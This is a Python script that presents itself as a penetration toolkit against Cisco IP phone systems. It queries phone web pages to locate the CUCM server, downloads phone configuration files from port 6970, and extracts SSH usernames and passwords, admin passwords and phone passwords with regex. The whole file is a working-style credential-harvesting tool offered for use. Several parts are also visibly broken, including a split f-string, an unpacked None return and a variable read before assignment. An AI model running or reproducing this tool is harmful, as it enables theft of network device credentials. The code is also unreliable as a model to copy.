import argparse
import requests
import re

def get_cucm_name_from_phone(phone):
    url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=phone)
    try:
        __http_response = requests.get(url, timeout=2)
        if __http_response.status_code == 404:
            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
            __http_response = requests.get(url)
        return parse_cucm(__http_response.text)
    except Exception as e:
        pass

def parse_cucm(html):
    cucm = re.search(r'<b>\s*cucm server\d.+?<b>(\S+)', html, re.IGNORECASE)
    cucm = re.search(r'<b>(\S+)\ +Active', html, re.IGNORECASE)
    if cucm is None:
        return None
    else:
        if cucm.group(1):
            if verbose:
                print(f'Carved CUCM: {cucm.group(1).replace("&#x2D;","-")}')
            return cucm.group(1).replace('&#x2D;','-')

def get_config_names(CUCM_host,hostnames=None):
    config_names = []
    if hostnames is None:
        url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
        try:
            __http_response = requests.get(url, timeout=2)
            if __http_response.status_code != 404:
                lines = __http_response.text
                print(f'Pulled ConfigFileCacheList.txt from CUCM Server {CUCM_host}')
                for line in lines.split('\n'):
                    match = re.match(r'((?:CIP|SEP)[0-9A-F]{12}\S+)',line, re.IGNORECASE)
                    if match:
                        config_names.append(match.group(1))
                        if verbose:
                            print(f'Found config_name: {match.group(1)}')
        except requests.exceptions.ConnectionError:
            print('CUCM Server {} is not responding'.format(CUCM_host))
    else:
        for host in hostnames:
            config_names.append('{host}.cnf.xml'.format(host=host))
    if config_names == []:
        return None
    else:
        return config_names

def get_hostname_from_phone(phone):
    url = "http://{0}/CGI/Java/Serviceability?adapter=device.statistics.device".format(phone)
    __http_response = requests.get(url)
    if __http_response.status_code == 404:
        if verbose:
            print('Config file not found on HTTP Server: {0}'.format(phone))
    else:
        lines = __http_response.text
    return parse_phone_hostname(lines,phone)

def parse_phone_hostname(html, phoneip):
    html = html.replace('\n', '').replace('\r', '')
    hostname = re.search(r'(SEP[a-z0-9]{12})', html.strip(), re.IGNORECASE)
    if hostname is None:
        if verbose:
            print(f'Could not find hostname for {phoneip}')
        return None
    else:
        if hostname.group(1):
            return hostname.group(1)

def search_for_secrets(CUCM_host,filename):
    global found_credentials
    global found_usernames
    lines = str()
    user = str()
    user2 = str()
    password = str()
    url = "http://{0}:6970/{1}".format(CUCM_host,
                                        filename)
    try:
        __http_response = requests.get(url, timeout=10)
        if __http_response.status_code == 404:
            if verbose:
                print('Config file not found on HTTP Server: {0}'.format(filename))
        else:
            lines = __http_response.text
        for line in lines.split('\n'):
            match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
            if match:
                if match.group(2):
                    user = match.group(2)
                    found_usernames.append((user,filename))
                if match.group(3):
                    password = match.group(3)
                    found_credentials.append((user,password,filename))
                if match.group(4):
                    user2 = match.group(4)
                    found_usernames.append((user2,filename))
                if match.group(5):
                    user2 = match.group(5)
                    found_credentials.append(('unknown',password,filename))
        if verbose:
            if user and password:
                print('{0}\t{1}\t{2}'.format(filename,user,password))
            elif user:
                print('SSH Username is {0} password was not set in {1}'.format(user,filename))
            elif password:
                print('SSH Username is not set, but password is {0} in {1}'.format(password,filename))
            elif user2:
                print('Possible AD username {0} found in config {1}'.format(user2,filename))
            else:
                if verbose:
                    print('Username and password not set in {0}'.format(filename))
    except Exception as e:
        print("Could not connect to {CUCM_host}".format(CUCM_host=CUCM_host))

def get_confpage(phoneip):
    url = f'http://{phoneip}/CGI/Java/Serviceability?'
            'adapter=device.statistics.configuration'
    try:
        __http_response = requests.get(url, timeout=2)
        if __http_response.status_code == 404:
            url = f'http://{phoneip}/NetworkConfiguration'
            __http_response = requests.get(url)
        return __http_response.text
    except Exception as e:
        if verbose:
            print(f'Failed getting conf page from {phoneip}:', e)

def scrape_phone(phoneip):
    phone_confpage = get_confpage(phoneip)
    phone_hostname = parse_phone_hostname(phone_confpage, phoneip)
    cucm_servers = parse_cucm(phone_confpage)

if __name__ == '__main__':
    global found_usernames
    global found_credentials

    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
    parser.add_argument('-pl', '--phonelist', type=str, help='A file with a list of phone IP addresses')
    parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')
    
#    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
#    parser.add_argument('--userenum', action='store_true', default=False, help='Enable user enumeration via UDS API')
    
#    parser.add_argument('-s','--subnet', type=str, help='IP Address of a Cisco Phone')
    
#    parser.add_argument('-e','--enumsubnet', type=str, help='IP Subnet to enumerate and pull credentials from in CIDR format x.x.x.x/24')

    args = parser.parse_args()

#    CUCM_host = args.host
    phonelist = args.phonelist
    phone = args.phone
#    subnet = args.subnet
    verbose = args.verbose
#    enumsubnet = args.enumsubnet
    found_credentials = []
    found_usernames = []
    file_names = ''
    hostnames = []
    phoneips = []
    
    if phonelist:
        try:
            phoneips = open(phonelist).read().split('\n')
        except FileNotFoundError as e:
            print(e)
            quit(1)

    if phone:
        phoneips.append(phone)

    if not len(phoneips):
        print('Got nothing to work with. Provide either a --phonelist or --phone')
        quit(1)
        
    for phoneip in phoneips:
        (phone_hostname, cucm_hosts) = scrape_phone(phoneip)
        
#    get_version(CUCM_host)

    CUCM_host = get_cucm_name_from_phone(phone) if CUCM_host is None else CUCM_host
    if CUCM_host is None:
        print('Unable to automatically detect the CUCM Server.')
        quit(1)
    else:
        print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))

    file_names = get_config_names(CUCM_host)
    if file_names is None:
        hostnames = [get_hostname_from_phone(phone)]
        file_names = get_config_names(CUCM_host, hostnames=hostnames)

    if file_names is None:
        print('Unable to detect file names from CUCM')
    else:
        for file in file_names:
            search_for_secrets(CUCM_host,file)

    if found_credentials != []:
        print('Credentials Found in Configurations!')
        for cred in found_credentials:
            print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))

    if found_usernames != []:
        print('Usernames Found in Configurations!')
        for usernames in found_usernames:
            print('{0}\t{1}'.format(usernames[0],usernames[1]))
